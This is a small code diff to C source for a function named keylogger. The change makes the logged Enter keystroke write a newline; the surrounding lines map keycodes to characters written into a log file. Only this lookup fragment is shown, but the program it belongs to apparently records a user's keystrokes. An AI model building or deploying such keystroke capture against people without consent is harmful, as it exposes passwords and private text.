@@ -96,7 +96,7 @@ void *keylogger(char *deviceFile)
                 case 25 : fputs("p ", file_log);   break;
                 case 26 : fputs("^ ", file_log);   break;
                 case 27 : fputs("$ ", file_log);   break;
-                case 28 : fputs("[Enter] ", file_log);   break;
+                case 28 : fputs("[Enter]\n", file_log);   break;
                 case 29 : fputs("[LCtrl] ", file_log);   break;
                 case 30 : fputs("q ", file_log);   break;
                 case 31 : fputs("s ", file_log);   break;
